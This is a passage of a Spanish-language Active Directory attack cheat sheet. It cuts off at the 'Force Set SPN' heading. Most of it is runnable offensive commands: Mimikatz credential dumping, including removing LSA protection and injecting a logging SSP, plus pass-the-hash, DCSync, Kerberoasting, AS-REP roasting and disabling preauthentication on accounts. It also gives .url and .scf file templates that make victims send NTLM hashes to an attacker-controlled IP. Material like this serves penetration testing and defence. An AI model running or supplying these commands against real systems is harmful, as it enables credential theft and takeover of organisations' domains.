> Active Directory (AD) es un servicio de directorio utilizado en entornos empresariales Windows desde el año 2000. Se basa en los protocolos X.500 y LDAP, y permite una gestión centralizada y jerárquica de recursos como usuarios, equipos, grupos, políticas, dispositivos, recursos compartidos y relaciones de confianza. Proporciona funciones de autenticación, autorización y contabilización (AAA) dentro de un entorno Windows.

**Esta chuleta contiene métodos comunes de enumeración y ataque para Active Directory en Windows. Está inspirada en el repositorio [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings).**
## Índice

  - [[#Índice|Índice]]
  - [[#Herramientas|Herramientas]]
  - [[#Enumeración de Dominio|Enumeración de Dominio]]
    - [[#Usando PowerView]]
    - [[#Usando el módulo AD]]
    - [[#Usando BloodHound]]
      - [[#BloodHound remoto]]
      - [[#BloodHound On Site]]
    - [[#Usando Adalanche]]
      - [[#Adalanche remoto]]
    - [[#Exportar Enumerated Objects]]
    - [[#Herramientas útiles de enumeración]]
  - [[#Escalada de privilegios local]]
    - [[#Herramientas útiles para Escalada de Privilegios Local]]
  - [[#Movimiento lateral]]
    - [[#PowerShell Remoto]]
    - [[#RCE con credenciales PowerShell]]
    - [[#Importar un módulo de PowerShell y ejecutar sus funciones de forma remota]]
    - [[#Ejecución de comandos remotos con estado]]
    - [[#Mimikatz]]
    - [[#Remote Desktop Protocol]]
    - [[#Ataques con archivo URL]]
  - [[#Escalada de privilegios en el Dominio]]
    - [[#Kerberoasting]]
    - [[#ASREPRoasting]]
    - [[#Password Spraying Attack]]
    - [[#Force Set SPN|Forzar SPN]]
    - [[#Abuso de Shadow Copies (Copias de Sombra)|Explotar Shadow Copies]]
    - [[#Listar y Descifrar Credenciales Almacenadas con Mimikatz]]
    - [[#Unconstrained Delegation|Delegación no restringida]]
    - [[#Constrained Delegation|Delegación restringida]]
    - [[#Resource Based Constrained Delegation (RBCD)|Delegación restringida basada en recursos]]
    - [[#DNSAdmins Abuse|Abuso de DNSAdmins]]
    - [[#Abuso del DNS Integrado en Active Directory (ADIDNS)]]
    - [[#Abuso del grupo **Backup Operators** |Abuso del grupo Backup Operators]]
    - [[#Abuso de Exchange]]
    - [[#Weaponizing Printer Bug|Bug de la impresora]]
    - [[#Abuso de ACLs en AD]]
    - [[#Abuso de IPv6 en redes IPv4 con mitm6]]
    - [[#SID History Abuse]]
    - [[#Explotación de SharePoint]]
    - [[#Zerologon]]
    - [[#PrintNightmare]]
    - [[#Abuso de Active Directory Certificate Services (ADCS)]]
    - [[#**No PAC (noPAC)** – Abuso de CVE-2021-42278 + CVE-2021-42287 |Abuso de No PAC]]
  - [[#Persistencia en el Dominio]]
    - [[#Ataque con Golden Ticket]]
    - [[#Ataque DCsync]]
    - [[#Ataque Silver Ticket con mimikatz]]
    - [[#Skeleton Key Attack]]
    - [[#DSRM Abuse (Directory Services Restore Mode)]]
    - [[#Custom SSP (Security Support Provider)]]
  - [[#Cross Forest Attacks]]
    - [[#Trust Tickets|Tickets de confianza]]
    - [[#Abuse MSSQL Servers|Abusar de servidores MSSQL]]
    - [[#Breaking Forest Trusts (Rompimiento de Confianzas entre Bosques)]]

### Herramientas

- [Powersploit](https://github.com/PowerShellMafia/PowerSploit/tree/dev)
- [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL)
- [Powermad](https://github.com/Kevin-Robertson/Powermad)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [Rubeus](https://github.com/GhostPack/Rubeus) -> [Compiled Version](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)
- [BloodHound](https://github.com/BloodHoundAD/BloodHound)
- [AD Module](https://github.com/samratashok/ADModule)
- [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)
- [Adalanche](https://github.com/lkarlslund/adalanche)
### Enumeración de Dominio

**¿Qué es esto?**  
Fase inicial en una intrusión en entorno Active Directory. Consiste en recopilar información sobre **usuarios, grupos, equipos, políticas, relaciones de confianza y privilegios**. Es clave para **identificar vectores de ataque y planificar los siguientes pasos** en la intrusión.
##### Usando PowerView

[Powerview v.3.0](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
[Powerview Wiki](https://powersploit.readthedocs.io/en/latest/)

>Primero necesitaremos desactivar la protección contra la ejecución de scripts:

```powershell
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```

- **Obtener dominio actual:** `Get-Domain`
- **Enumerar otros dominios** `Get-Domain -Domain <DomainName>`
- **Obtener SID de dominio:** `Get-DomainSID`
- **Obtener política de dominio:**

```powershell
#Obtener la política del dominio
Get-DomainPolicy

#Mostrará las configuraciones de política del dominio relacionadas con el acceso al sistema o Kerberos
Get-DomainPolicy | Select-Object -ExpandProperty SystemAccess
Get-DomainPolicy | Select-Object -ExpandProperty KerberosPolicy
```

- **Obtener controladores de dominio:**

```powershell
Get-DomainController
Get-DomainController -Domain <DomainName>
```

- **Obtener usuarios de dominio**

```powershell
#Guardar todos los usuarios del dominio en un archivo
Get-DomainUser | Out-File -FilePath .\DomainUsers.txt

#Devolverá propiedades específicas de un usuario concreto
Get-DomainUser -Identity [nombredeusuario] -Properties DisplayName, MemberOf | Format-List

#Enumerar los usuarios conectados en una máquina
Get-NetLoggedon -ComputerName <NombreDelEquipo>

#Enumerar información de sesión de una máquina
Get-NetSession -ComputerName <NombreDelEquipo>

#Enumerar las máquinas del dominio actual o especificado donde están conectados usuarios concretos
Find-DomainUserLocation -Domain <NombreDelDominio> | Select-Object UserName, SessionFromName
```

- **Enumerar ordenadores de dominio**

```powershell
Get-DomainComputer -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName

#Enumerar máquinas activas
Get-DomainComputer -Ping -Properties OperatingSystem, Name, DnsHostName | Sort-Object -Property DnsHostName
```

- **Enumerar grupos y miembros de grupo:**

```powershell
#Guardar todos los grupos del dominio en un archivo:
Get-DomainGroup | Out-File -FilePath .\DomainGroup.txt

#Devolver los miembros de un grupo específico (por ejemplo, Domain Admins y Enterprise Admins)
Get-DomainGroup -Identity '<GroupName>' | Select-Object -ExpandProperty Member
Get-DomainGroupMember -Identity '<GroupName>' | Select-Object MemberDistinguishedName

#Enumerar los grupos locales en la máquina local (o remota). Requiere derechos de administrador local en la máquina remota
Get-NetLocalGroup | Select-Object GroupName

#Enumerar los miembros de un grupo local específico en la máquina local (o remota). También requiere derechos de administrador local en la máquina remota
Get-NetLocalGroupMember -GroupName Administrators | Select-Object MemberName, IsGroup, IsDomain

#Devolver todos los GPOs en un dominio que modifican membresías de grupos locales mediante Grupos Restringidos o Preferencias de Directiva de Grupo
Get-DomainGPOLocalGroup | Select-Object GPODisplayName, GroupName
  ```

- **Enumerar shares (recursos compartidos):**

```powershell
#Enumerar recursos compartidos del dominio
Find-DomainShare

#Enumerar recursos compartidos del dominio a los que el usuario actual tiene acceso
Find-DomainShare -CheckShareAccess

#Enumerar archivos "interesantes" en los recursos compartidos accesibles
Find-InterestingDomainShareFile -Include *passwords*
```

- **Enumerar políticas de grupo:**

```powershell
#Obtener todos los GPOs con sus nombres
Get-DomainGPO -Properties DisplayName | Sort-Object -Property DisplayName

#Enumerar todos los GPOs aplicados a un equipo específico
Get-DomainGPO -ComputerIdentity <NombreDelEquipo> -Properties DisplayName | Sort-Object -Property DisplayName

#Obtener usuarios que forman parte del grupo de Administradores locales de una máquina
Get-DomainGPOComputerLocalGroupMapping -ComputerName <NombreDelEquipo>
```

- **Enumerar OUs:**

```powershell
Get-DomainOU -Properties Name | Sort-Object -Property Name
```

- **Enumerar ACLs:**

```powershell
#Devuelve los ACLs asociados a la cuenta especificada
Get-DomaiObjectAcl -Identity <NombreDeCuenta> -ResolveGUIDs

#Buscar ACEs interesantes
Find-InterestingDomainAcl -ResolveGUIDs

#Comprobar los ACLs asociados a una ruta específica (por ejemplo, un recurso compartido SMB)
Get-PathAcl -Path "\\Ruta\De\Un\Recurso"
```

- **Enumerar Domain Trust:**

```powershell
#Enumerar las relaciones de confianza del dominio actual
Get-DomainTrust

#Enumerar las relaciones de confianza de un dominio específico
Get-DomainTrust -Domain <NombreDelDominio>

#Enumerar todas las relaciones de confianza del dominio actual y luego de cada dominio encontrado
Get-DomainTrustMapping
```

- **Enumerar Forest Trust:**

```powershell
#Obtener todos los dominios que forman parte del bosque actual
Get-ForestDomain

#Obtener todos los dominios que forman parte de un bosque específico
Get-ForestDomain -Forest <NombreDelBosque>

#Mapear las relaciones de confianza del bosque actual
Get-ForestTrust

#Mapear las relaciones de confianza de un bosque específico
Get-ForestTrust -Forest <NombreDelBosque>
```

- **Caza de usuarios:**

```powershell
#Encuentra todas las máquinas en el dominio actual donde el usuario actual tiene acceso como administrador local
Find-LocalAdminAccess -Verbose

#Encuentra administradores locales en todas las máquinas del dominio
Find-DomainLocalGroupMember -Verbose

#Encuentra ordenadores donde un Domain Admin O un usuario específico tiene sesión iniciada
Find-DomainUserLocation | Select-Object UserName, SessionFromName

#Confirmar acceso como administrador
Test-AdminAccess
```

> **Escalada de privilegios a Administrador de Dominio mediante caza de usuarios:** 

1. Tengo acceso local de administrador a una máquina 
2. Un administrador de dominio tiene una sesión en dicha máquina 
3. Le robo su token y me hago pasar por él 
4. ¡Hecho!

### Usando el módulo AD

- **Obtener dominio actual** `Get-ADDomain`
- **Enumerar otros dominios:** `Get-ADDomain -Identity <Domain>`
- **Obtener SID del dominio:** `Get-DomainSID`
- **Obtener controladores de dominio:**

```powershell
Get-ADDomainController
Get-ADDomainController -Identity <DomainName>
```

- **Enumerar usuarios de dominio:**

```powershell
Get-ADUser -Filter * -Identity <usuario> -Properties *

#Obtener una "cadena" específica en un atributo de un usuario
Get-ADUser -Filter 'Description -like "*loquesea*"' -Properties Description | select Name, Description
```

- **Enumerar ordenadores de Dominio:**

```powershell
Get-ADComputer -Filter * -Properties *
Get-ADGroup -Filter *
```

- **Enumerar Domain Trust:**

```powershell
Get-ADTrust -Filter *
Get-ADTrust -Identity <NombreDelDominio>
```

- **Enumerar Forest Trust:**

```powershell
Get-ADForest
Get-ADForest -Identity <ForestName>

#Enumerar dominios del bosque
(Get-ADForest).Domains
```

- **Enumerar Política Efectiva Local AppLocker:**

```powershell
Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

### Usando BloodHound

**BloodHound** permite analizar relaciones de privilegios y rutas de ataque en entornos Active Directory. A continuación se explican formas de recopilar datos. Para más información sobre la herramienta, consultar [[BloodHound y SharpHound]].
##### BloodHound remoto

[Repositorio Python de BloodHound](https://github.com/fox-it/BloodHound.py) o instálalo con `pip3 install bloodhound`

```powershell
bloodhound-python -u <Usuario> -p <Contraseña> -ns <IP del Controlador de Dominio> -d <Dominio> -c All
```
##### BloodHound On Site

- **Usando el `.exe`**

```powershell
.\SharpHound.exe --CollectionMethod All `
  --LdapUsername <UserName> `
  --LdapPassword <Password> `
  --domain <Domain> `
  --domaincontroller <Domain Controller IP> `
  --OutputDirectory <RutaSalida>
```

- **Usando el módulo PowerShell (`.ps1`)**

```powershell
. .\SharpHound.ps1

Invoke-BloodHound -CollectionMethod All `
  -LdapUsername <UserName> `
  -LdapPassword <Password> `
  -OutputDirectory <RutaSalida>
```

### Usando Adalanche

**Adalanche** es una herramienta de visualización y análisis de relaciones en Active Directory. Permite recolectar datos del dominio y analizarlos en una interfaz gráfica interactiva para detectar posibles vectores de ataque, relaciones de privilegios y delegaciones mal configuradas.
##### Adalanche remoto

- **Recolección de datos con Adalanche**

```bash
# Recolección básica desde Kali Linux
./adalanche collect activedirectory \
  --domain windcorp.local \
  --username spoNge369@windcorp.local \
  --password 'password123!' \
  --server dc.windcorp.htb
```

> ✅ **→ Termina correctamente con:** `Terminating successfully`

**¿Errores comunes?**

🔒 **Error de certificado (x509 unknown authority)**

```bash
./adalanche collect activedirectory \
  --domain windcorp.local \
  --username spoNge369@windcorp.local \
  --password 'password123!' \
  --server dc.windcorp.htb \
  --tlsmode NoTLS \
  --port 389
```

❌ **¿Credenciales inválidas?**

```bash
./adalanche collect activedirectory \
  --domain windcorp.local \
  --username spoNge369@windcorp.local \
  --password 'password123!' \
  --server dc.windcorp.htb \
  --tlsmode NoTLS \
  --port 389 \
  --authmode basic
```

📊 **Análisis de datos recolectados**

```bash
# Ejecutar interfaz gráfica local
./adalanche analyze
```

> Luego accede desde el navegador a: [http://127.0.0.1:8080](http://127.0.0.1:8080)
##### Exportar Enumerated Objects

Puedes exportar los objetos enumerados desde cualquier módulo o cmdlet a un archivo XML para analizarlos más adelante.

El cmdlet `Export-Clixml` crea una representación en XML basada en la Common Language Infrastructure (CLI) de uno o varios objetos, y la guarda en un archivo. Luego puedes usar el cmdlet `Import-Clixml` para recrear el objeto guardado a partir del contenido de ese archivo.

```powershell
# Exportar los usuarios del dominio a un archivo XML.
Get-DomainUser | Export-CliXml .\DomainUsers.xml

# Más adelante, cuando quieras analizarlos incluso en otra máquina.
$DomainUsers = Import-CliXml .\DomainUsers.xml

# Ahora puedes aplicar cualquier condición, filtro, etc.

$DomainUsers | select name

$DomainUsers | ? {$_.name -match "NombreDelUsuario"}
```

##### Herramientas útiles de enumeración

- [ldapdomaindump](https://github.com/dirkjanm/ldapdomaindump): Herramienta para volcar información del dominio a través de LDAP.
- [adidnsdump](https://github.com/dirkjanm/adidnsdump): Permite extraer registros DNS integrados usando cualquier usuario autenticado.
- [ACLight](https://github.com/cyberark/ACLight): Descubrimiento avanzado de cuentas privilegiadas.
- [ADRecon](https://github.com/sense-of-security/ADRecon): Herramienta detallada de reconocimiento en entornos Active Directory.

### Escalada de privilegios local

- [**Windows Local Privilege Escalation Cookbook**](https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook): Recopilación de técnicas para la escalada local de privilegios en Windows.  

- [**Juicy Potato**](https://github.com/ohpe/juicy-potato): Abusa de los privilegios `SeImpersonate` o `SeAssignPrimaryToken` para suplantar al sistema.  
    ⚠️ Solo funciona hasta Windows Server 2016 y Windows 10 versión 1803.    

- [**Lovely Potato**](https://github.com/TsukiCTF/Lovely-Potato): Versión automatizada de Juicy Potato.  
    ⚠️ Solo funciona hasta Windows Server 2016 y Windows 10 versión 1803.    

- [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer): Explota la vulnerabilidad PrinterBug para suplantar al sistema.  
    ⚠️ Funciona en Windows Server 2019 y Windows 10.    

- [**RoguePotato**](https://github.com/antonioCoco/RoguePotato): Evolución de Juicy Potato.  
    ⚠️ Funciona en Windows Server 2019 y Windows 10.    

- [**Abusing Token Privileges**](https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/): Artículo sobre cómo abusar de privilegios de token para escalada local.   

- [**SMBGhost CVE-2020-0796**](https://blog.zecops.com/vulnerabilities/exploiting-smbghost-cve-2020-0796-for-a-local-privilege-escalation-writeup-and-poc/): Vulnerabilidad en SMB que permite escalada local.  
    [PoC](https://github.com/danigargu/CVE-2020-0796)    

- [**CVE-2021-36934 (HiveNightmare / SeriousSAM)**](https://github.com/cube0x0/CVE-2021-36934): Vulnerabilidad que permite acceso no autorizado a los archivos del registro de Windows.

### Herramientas útiles para Escalada de Privilegios Local

- [**PowerUp**](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Privesc/PowerUp.ps1): Abuso de configuraciones incorrectas en Windows (PowerShell).    
- [**BeRoot**](https://github.com/AlessandroZ/BeRoot): Herramienta general de enumeración para escalada de privilegios.    
- [**Privesc**](https://github.com/enjoiz/Privesc): Herramienta genérica para enumerar vectores de escalada de privilegios.    
- [**FullPowers**](https://github.com/itm4n/FullPowers): Restaura los privilegios de una cuenta de servicio.

### Movimiento lateral

**¿Qué es esto?**  
Técnicas que permiten moverse **entre diferentes sistemas del dominio** una vez que se ha comprometido una cuenta o máquina. Sirve para **expandir el control dentro de la red**, recolectar más credenciales o alcanzar objetivos de mayor valor, como un controlador de dominio.
##### PowerShell Remoto

```powershell
# Habilitar PowerShell Remoting en la máquina actual (requiere acceso de administrador)
Enable-PSRemoting

# Iniciar o entrar en una nueva sesión remota de PowerShell (requiere acceso de administrador)
$sess = New-PSSession -ComputerName <NombreEquipo>
Enter-PSSession -ComputerName <NombreEquipo>  # O bien:
Enter-PSSession -Session $sess
```

##### RCE con credenciales PowerShell

```powershell
$SecPassword = ConvertTo-SecureString '<Wtver>' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb.local\<WtverUser>', $SecPassword)
Invoke-Command -ComputerName <WtverMachine> -Credential $Cred -ScriptBlock {whoami}
```

##### Importar un módulo de PowerShell y ejecutar sus funciones de forma remota

```powershell
# Ejecutar el comando e iniciar una sesión
Invoke-Command -Credential $cred -ComputerName <NombreDelEquipo> -FilePath c:\Ruta\del\archivo.ps1 -Session $sess

# Interactuar con la sesión remota
Enter-PSSession -Session $sess
```

##### Ejecución de comandos remotos con estado

```powershell
# Crear una nueva sesión
$sess = New-PSSession -ComputerName <NombreDelEquipo>

# Ejecutar un comando en la sesión
Invoke-Command -Session $sess -ScriptBlock {$ps = Get-Process}

# Comprobar el resultado del comando para confirmar que tenemos una sesión interactiva
Invoke-Command -Session $sess -ScriptBlock {$ps}
```

##### Mimikatz

```powershell
# Volcar el proceso LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

# (Over) Pass-The-Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<NombreUsuario> /ntlm:<HashNTLM> /domain:<DominioFQDN>

# Listar todos los tickets Kerberos en memoria
mimikatz sekurlsa::tickets

# Volcar credenciales de Servicios de Escritorio Remoto (Terminal Services) locales
mimikatz sekurlsa::tspkg

# Volcar y guardar LSASS en un archivo
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

# Listar MasterKeys cacheadas
mimikatz sekurlsa::dpapi

# Listar claves AES locales de Kerberos
mimikatz sekurlsa::ekeys

# Volcar la base de datos SAM
mimikatz lsadump::sam

# Volcar la base de datos SECRETS
mimikatz lsadump::secrets

# Inyectar y volcar las credenciales del Controlador de Dominio
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

# Volcar las credenciales del dominio sin tocar LSASS del DC y de forma remota
mimikatz lsadump::dcsync /domain:<DominioFQDN> /all

# Volcar contraseñas antiguas y hashes NTLM de un usuario
mimikatz lsadump::dcsync /user:<DominioFQDN>\<usuario> /history

# Listar y volcar credenciales Kerberos locales
mimikatz kerberos::list /dump

# Pass-The-Ticket
mimikatz kerberos::ptt <RutaAlArchivoKirbi>

# Listar sesiones de Terminal Server/RDP
mimikatz ts::sessions

# Listar credenciales guardadas en el almacén (Vault)
mimikatz vault::list
```

❗ **¿Y si Mimikatz falla al volcar credenciales debido a la protección LSA (LSA Protection)?**

→ Significa que LSASS está protegido con `RunAsPPL`, lo que impide a procesos no confiables acceder a su memoria. Para bypass:

- Necesitas firmar Mimikatz como binario confiable (driver vulnerable o ataque de UEFI/bootkit).    
- O bien usar vulnerabilidades que permitan desactivar temporalmente esta protección (ej. CVE específicas, bypass por maldrivers, etc.).

----

- LSA como Proceso Protegido (Bypass desde Kernel)

```powershell
# Comprobar si LSA se ejecuta como proceso protegido (RunAsPPL = 0x1)
reg query HKLM\SYSTEM\CurrentControlSet\Control\Lsa

# Subir mimidrv.sys (desde el repositorio oficial de Mimikatz) a la misma carpeta que mimikatz.exe

# Importar el driver mimidrv al sistema
mimikatz # !+

# Quitar las flags de protección del proceso lsass.exe
mimikatz # !processprotect /process:lsass.exe /remove

# Finalmente, ejecutar el volcado de credenciales
mimikatz # sekurlsa::logonpasswords
  ```

- LSA como Proceso Protegido (Bypass desde Userland "Fileless")

- [**PPLdump**](https://github.com/itm4n/PPLdump): herramienta para volcar LSASS protegido sin necesidad de driver, aprovechando mecanismos desde userland.    

- [**Artículo: Bypassing LSA Protection in Userland**](https://blog.scrt.ch/2021/04/22/bypassing-lsa-protection-in-userland): explicación detallada del enfoque.

- LSA ejecutándose como proceso virtualizado (LSAISO) por Credential Guard

```powershell
# Comprobar si el proceso lsaiso.exe está en ejecución
tasklist | findstr lsaiso

# Si está presente, no se puede volcar LSASS. Solo se obtiene información cifrada.
# En este caso, aún se pueden usar keyloggers o capturadores del portapapeles.
# Ejemplo: inyectar un Security Support Provider malicioso en memoria (Mimikatz lo proporciona)
mimikatz # misc::memssp

# A partir de aquí, todas las sesiones y autenticaciones se loguearán con credenciales en texto claro en:
# c:\windows\system32\mimilsa.log
  ```

---

**Recursos adicionales**

- [**Guía detallada de Mimikatz**](https://adsecurity.org/?page_id=1821)    
- [**Análisis de las 2 protecciones de LSASS**](https://medium.com/red-teaming-with-a-blue-team-mentaility/poking-around-with-2-lsass-protection-options-880590a72b1a)
### Remote Desktop Protocol

Si el host al que queremos movernos lateralmente tiene activado **RestrictedAdmin**, podemos usar el hash NTLM mediante el protocolo **RDP**, sin necesidad de la contraseña en texto claro, y obtener una sesión interactiva.

- Mimikatz:

```powershell
# Ejecutamos Pass-The-Hash con Mimikatz y lanzamos mstsc.exe con el flag "/restrictedadmin"
privilege::debug
sekurlsa::pth /user:<Usuario> /domain:<Dominio> /ntlm:<HashNTLM> /run:"mstsc.exe /restrictedadmin"

# Después, simplemente hacemos clic en "Aceptar" en el diálogo de RDP y obtenemos una sesión interactiva como el usuario suplantado.
```

- xFreeRDP:

```powershell
xfreerdp +compression +clipboard /dynamic-resolution +toggle-fullscreen /cert-ignore /bpp:8 /u:<Usuario> /pth:<HashNTLM> /v:<IP o Hostname>
```

❗ **¿Y si RestrictedAdmin está desactivado en el host remoto?**

Podemos conectarnos al equipo objetivo mediante otro protocolo (por ejemplo `psexec` o `winrm`) y habilitar el modo RestrictedAdmin **creando esta clave de registro** y poniéndola a `0`:

```powershell
Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value 0 -Type DWord
```

- Bypass "Single Session per User" Restriction

Si tienes ejecución de comandos como `SYSTEM` o administrador local en un equipo unido al dominio, y deseas iniciar una sesión RDP **sin cerrar la del usuario que ya está conectado**, puedes evitar la restricción modificando el registro:

```powershell
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser /t REG_DWORD /d 0
```

>✅ Esto permite múltiples sesiones RDP para un mismo usuario al mismo tiempo.

**Restaurar el comportamiento por defecto (una sesión por usuario)**

```powershell
REG DELETE "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v fSingleSessionPerUser
```

##### Ataques con archivo URL

- Archivo .url

  ```
  [InternetShortcut]
  URL=whatever
  WorkingDirectory=whatever
  IconFile=\\<AttackersIp>\%USERNAME%.icon
  IconIndex=1
  ```

  ```
  [InternetShortcut]
  URL=file://<AttackersIp>/leak/leak.html
  ```

- Archivo .scf

  ```
  [Shell]
  Command=2
  IconFile=\\<AttackersIp>\Share\test.ico
  [Taskbar]
  Command=ToggleDesktop
  ```

Colocando estos archivos en un recurso compartido con permisos de escritura, la víctima solo tiene que **abrir el explorador de archivos y navegar al recurso**.  

> **Importante**: el archivo **no necesita ser abierto ni ejecutado por el usuario**. Basta con que esté visible (por ejemplo, en el nivel superior del recurso compartido) dentro de la ventana del explorador para que sea procesado por el sistema.

Puedes usar **Responder** para capturar los hashes cuando esto ocurra.

❗ **Advertencia**: Los ataques con archivos `.scf` **ya no funcionan en las versiones más recientes de Windows**.

##### Herramientas útiles

- [**Powercat**](https://github.com/besimorhino/powercat): Versión de Netcat escrita en PowerShell. Permite tunelado, relays y redirección de puertos.    
- [**SCShell**](https://github.com/Mr-Un1k0d3r/SCShell): Herramienta de movimiento lateral sin archivos (**fileless**) que usa `ChangeServiceConfigA` para ejecutar comandos.    
- [**Evil-WinRM**](https://github.com/Hackplayers/evil-winrm): La shell definitiva para pentesting a través de WinRM.    
- [**RunasCs**](https://github.com/antonioCoco/RunasCs): Versión en C# y de código abierto de `runas.exe`.    
- [**ntlm_theft**](https://github.com/Greenwolf/ntlm_theft.git): Genera todos los formatos de archivos posibles para ataques de robo de hash vía URL (ej. `.scf`, `.url`, `.lnk`, etc.).

### Escalada de privilegios en el Dominio

**¿Qué es esto?**  
Son técnicas utilizadas para pasar de **un usuario con pocos privilegios** (como un usuario autenticado común) a **un usuario con privilegios elevados**, como administradores de dominio. Se aprovechan **configuraciones inseguras, delegaciones, hashes expuestos o privilegios mal asignados** dentro del entorno de Active Directory.
##### Kerberoasting

_¿Qué es esto?_  
Cualquier usuario del dominio (incluso sin privilegios) puede solicitar un Ticket Granting Service (TGS) para cualquier SPN (Service Principal Name) que esté asociado a una cuenta de tipo **usuario** (no máquina).

El TGS devuelto contiene un **blob cifrado con la contraseña del usuario**. Podemos extraer ese blob y luego **fuerzarlo por diccionario u offline** para obtener la contraseña en texto claro.

- PowerView:

```powershell
# Obtener cuentas de usuario que están asociadas a SPNs (Service Accounts)
Get-NetUser -SPN

# Enumerar todos los SPNs disponibles, solicitar un TGS para cada uno y volcar el hash
Invoke-Kerberoast

# Solicitar manualmente un TGS para una cuenta concreta con SPN
Request-SPNTicket

# Exportar todos los tickets Kerberos usando Mimikatz
Invoke-Mimikatz -Command '"kerberos::list /export"'
  ```

- AD Module:

```powershell
# Obtener cuentas de usuario que están siendo utilizadas como cuentas de servicio (es decir, tienen SPN asociados)
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

🔎 **Explicación**:  
Este comando usa el módulo `ActiveDirectory` para listar todas las cuentas de usuario que tienen algún `SPN` definido, lo cual indica que pueden ser objetivo de Kerberoasting.

- Impacket:

```powershell
python GetUserSPNs.py <DomainName>/<DomainUser>:<Password> -outputfile <FileName>
```

- Rubeus:

```powershell
# Realizar Kerberoasting y guardar la salida en un archivo con formato compatible para cracking
Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio>

# Kerberoasting evitando cuentas con cifrado AES (más "OPSEC safe")
Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio> /rc4opsec

# Kerberoasting específicamente contra cuentas con cifrado AES
Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio> /aes

# Kerberoasting dirigido a una cuenta concreta
Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio> /user:<nombreUsuario> /simple

# Kerberoasting autenticándose explícitamente con credenciales
Rubeus.exe kerberoast /outfile:<nombreArchivo> /domain:<NombreDominio> /creduser:<nombreUsuario> /credpassword:<contraseña>
```

##### ASREPRoasting

_¿Qué es esto?_  
Si una cuenta de usuario de dominio **no requiere preautenticación Kerberos**, podemos **solicitar un TGT válido sin conocer sus credenciales**, extraer el blob cifrado y **fuerzarlo por diccionario offline**.

🔍 Enumerar cuentas vulnerables:

- Con **PowerView**:

```powershell
Get-DomainUser -PreauthNotRequired -Verbose
```

- Con el módulo **ActiveDirectory**:

```powershell
Get-ADUser -Filter {DoesNotRequirePreAuth -eq $True} -Properties DoesNotRequirePreAuth
```

----

**⚠️ Forzar la desactivación de la preautenticación en una cuenta**

Si tienes permisos de escritura sobre una cuenta (WriteProperty, GenericWrite, etc.), puedes **desactivar Kerberos PreAuth** en ella y hacerla vulnerable a AS-REP Roasting.

----

🔎 **Consejo OPSEC**:  
Aplica un filtro como `RDPUsers`, `VPNUsers` o grupos similares para **evitar listar cuentas de equipo** (que suelen tener nombres como `PC123$` y cuyos hashes no son crackeables fácilmente).

**🧨 AS-REP Roasting – Ejecución del ataque**

- **PowerView:**

```powershell
# Buscar permisos interesantes (por ejemplo, sobre usuarios del grupo RDPUsers)
Invoke-ACLScanner -ResolveGUIDs | ? { $_.IdentinyReferenceName -match "RDPUsers" }

# Desactivar la preautenticación Kerberos en una cuenta si tenemos permisos
Set-DomainObject -Identity <NombreUsuario> -XOR @{useraccountcontrol=4194304} -Verbose

# Comprobar si el cambio se ha aplicado correctamente
Get-DomainUser -PreauthNotRequired -Verbose
```

- **Con la herramienta [ASREPRoast](https://github.com/HarmJ0y/ASREPRoast)**:

```powershell
# Obtener el hash AS-REP de una cuenta específica
Get-ASREPHash -UserName <NombreUsuario> -Verbose

# Obtener los hashes de todos los usuarios vulnerables a AS-REP Roasting
Invoke-ASREPRoast -Verbose
```

- **Con Rubeus**

```powershell
# Ejecutar el ataque contra todos los usuarios del dominio
Rubeus.exe asreproast /format:<hashcat|john> /domain:<NombreDominio> /outfile:<nombreArchivo>

# Ejecutar el ataque contra un usuario específico
Rubeus.exe asreproast /user:<nombreUsuario> /format:<hashcat|john> /domain:<NombreDominio> /outfile:<nombreArchivo>

# Ejecutar el ataque contra los usuarios de una unidad organizativa (OU) concreta
Rubeus.exe asreproast /ou:<NombreOU> /format:<hashcat|john> /domain:<NombreDominio> /outfile:<nombreArchivo>
```

- **Con Impacket:**

```powershell
# Ejecutar el ataque contra los usuarios especificados en un archivo
python GetNPUsers.py <nombre_dominio>/ -usersfile <archivo_de_usuarios> -outputfile <nombreArchivo>
```

##### Password Spraying Attack

Si hemos obtenido algunas contraseñas tras comprometer una cuenta, podemos aprovechar esta técnica para comprobar si **otras cuentas del dominio reutilizan esas mismas contraseñas**.

**Herramientas:**

- [**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray): Script en PowerShell para realizar ataques de password spraying de forma segura y flexible.    
- [**CrackMapExec**](https://github.com/byt3bl33d3r/CrackMapExec): Framework de post-explotación que permite realizar password spraying (entre muchas otras cosas).    
- [**Invoke-CleverSpray**](https://github.com/wavestone-cdt/Invoke-CleverSpray): Script OPSEC-friendly en PowerShell para spraying controlado y evasivo.    
- [**Spray**](https://github.com/Greenwolf/Spray): Herramienta ligera en Python para realizar password spraying contra servicios como LDAP, RDP, OWA, etc.
##### Force Set SPN

_¿Qué es esto?_  
